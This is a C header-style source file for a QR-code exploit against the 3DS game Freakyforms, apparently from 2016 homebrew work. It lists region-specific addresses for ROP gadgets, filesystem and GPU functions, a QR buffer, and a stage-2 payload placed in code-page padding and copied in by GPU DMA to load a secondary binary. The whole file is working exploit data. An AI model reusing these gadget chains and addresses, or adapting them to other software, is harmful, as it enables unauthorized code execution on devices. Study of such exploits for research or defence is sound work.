/* freakyforms qr code exploit. */
/* plutoo 2016 */
#include "macros.h"

REGION_CONST(QR_BUF_ADDR, 0x081428E8, 0x08140CA8, 0x0813F008);
REGION_CONST(GAME_CODEBIN_SIZE, 0x005B7000, 0x00542000, 0x004E6000);

/* Rop gadgets. */
REGION_CONST(GADGET_LDR_R7_R0_4__LDR_R0_R7__LDR_R1_R0__BLX_R1, 0x00305160, 0x00305AA4, 0x00304D70);
REGION_CONST(GADGET_ADD_SP_R7_0x64__POP_R4R5R6R7PC, 0x003A5978, 0x003A6BA4, 0x003A5DD0);
REGION_CONST(GADGET_LDRD_R0_R0__STRD_R0_R7__POP_R4R5R6R7R8PC, 0x00207C5C, 0x0020817C, 0x002079D8);
REGION_CONST(GADGET_NOP, 0x0012D624, 0x0012D7B0, 0x0012D714);
REGION_CONST(GADGET_R0, 0x0012D484, 0x00129AE8, 0x00129A68);
REGION_CONST(GADGET_R1, 0x002812D4, 0x002818C4, 0x00280ED4);
REGION_CONST(GADGET_R4, 0x00106D78, 0x00106DB0, 0x00106D50);
REGION_CONST(GADGET_R1R2R3R4R5, 0x0012BD08, 0x0012A890, 0x0012A810);
REGION_CONST(GADGET_POP_R4LR__BX_LR, 0x00399BBC, 0x001B3CF4, 0x001B320C);
REGION_CONST(GADGET_LDR_R0_R0, 0x003589CC, 0x001436A8, 0x001434AC);
REGION_CONST(GADGET_STREQ_R1_R0, 0x0032D324, 0x0032DC68, 0x0032CF34);
REGION_CONST(GADGET_STR_R1_R0, 0x003A41E4, 0x001045A8, 0x0010C924);
REGION_CONST(GADGET_CMP_R0_R1, 0x0020F52C, 0x0020FCE0, 0x0020F294);
REGION_CONST(GADGET_ADD_SP_R3__POP_PC, 0x0012C988, 0x0012CA14, 0x0012C978);
REGION_CONST(GADGET_ADD_R0_R0_R1__STR_R0_R4_0x154__POP_R4PC, 0x00106D70, 0x00106DA8, 0x00106D48);
REGION_CONST(SVC_SLEEP_THREAD_GADGET, 0x0028DE38, 0x0028E428, 0x0028DA38);
REGION_CONST(GSP_ENQUEUE_CMD_GADGET, 0x001169C4, 0x00116A34, 0x001169B4);

/* FS functions. */
REGION_CONST(FS_MOUNT_SDMC, 0x002CCCF8, 0x002CDA28, 0x002CCA34);
REGION_CONST(FS_OPEN_FILE, 0x0028CC30, 0x0028D220, 0x0028C830);
REGION_CONST(FS_READ_FILE, 0x00115A90, 0x00115B00, 0x00115A80);

/* GSP functions. */
REGION_CONST(GSP_FLUSH_DATA_CACHE, 0x00116AB8, 0x00116B28, 0x00116AA8);
REGION_CONST(GSP_ENQUEUE_CMD, 0x00285994, 0x00285F84, 0x00285594);
REGION_CONST(GSP_GX_CMD4, 0x00116BB8, 0x00116C28, 0x00116BA8);
REGION_CONST(GSP_GET_HANDLE, 0x0028A8F8, 0x0028AEE8, 0x0028A4F8);
REGION_CONST(GSP_GET_INTERRUPTRECEIVER, 0x00287F94, 0x00288584, 0x00287B94);
REGION_CONST(GSP_WRITE_HW_REGS, 0x00110080, 0x001100F0, 0x00110070);
REGION_CONST(GSP_THREAD_OBJ_PTR, 0x00594C40, 0x0051FC40, 0x00480C40);

/* We will overwrite the padding at end of the last code page. This guarantees
   that we don't overwrite existing code, and also avoids potential issues
   with the instruction cache. */
REGION_CONST(STAGE2_CODE_VA, 0x003AE800, 0x003AF200, 0x003AE400);
GLOBAL_CONST(STAGE2_CODE_PA, CODE_VA_TO_PA(STAGE2_CODE_VA));
GLOBAL_CONST(STAGE2_SIZE, 0x800); // European game limits this size.

GLOBAL_CONST(CODE_SCAN_BUF, 0x14300000);
/* The 4th word of the STAGE2_CODE_VA page. */
REGION_CONST(CODE_SCAN_PAGE_SIGNATURE, 0xFFFE47D8, 0xFFFEB240, 0xFFFDA69C);
GLOBAL_CONST(CODE_SCAN_START,
    PA_TO_GPU_ADDR(APPLICATION_HEAP_END - ((GAME_CODEBIN_SIZE + 0xFFF) &~ 0xFFF)));
GLOBAL_CONST(CODE_SCAN_START_OFFSETTED, CODE_SCAN_START + (STAGE2_CODE_VA & 0xFFF));

GLOBAL_CONST(FREAKYBIN_LOAD_ADDR, 0x14200000);
GLOBAL_CONST(FRAMEBUF_ADDR, 0x14200000);
GLOBAL_CONST(FRAMEBUF_SIZE, (400*240*4));
GLOBAL_CONST(PARAMBLK_ADDR, 0x14000000);
GLOBAL_CONST(OTHERAPP_CODE_VA, 0x00101000);
GLOBAL_CONST(OTHERAPP_CODE_PA, CODE_VA_TO_PA(OTHERAPP_CODE_VA));
GLOBAL_CONST(OTHERAPP_ADDR, 0x142C0000);
GLOBAL_CONST(OTHERAPP_SIZE, 0xC000);